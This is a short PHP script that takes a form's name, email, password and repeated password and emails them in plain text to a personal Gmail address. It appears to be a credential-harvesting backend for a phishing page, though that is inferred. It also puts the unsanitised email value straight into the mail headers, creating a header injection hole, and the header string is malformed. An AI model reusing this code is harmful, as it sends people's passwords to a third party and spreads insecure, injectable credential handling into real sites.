<?php
if (isset($_POST['submit'])) {
  

$nome=$_POST['nome'];
$senha=$_POST['senha'];
$email=$_POST['email'];
$rsenha=$_POST['rsenha'];
$to="maycolasforever@gmail.com";
$subject="Formulário- aks";
$body="Nome:".$nome."\n".
       "Email:".$email."\n".
       "Senha:".$senha."\n".
       "Senha novamente: ".$rsenha;
$header="From:oldgaara@gmail.com"."\n"."Reply-To".$email."\n"."X=Mailer:PHP/".phpversion();

mail($to, $subject, $body, $header);
}
?>
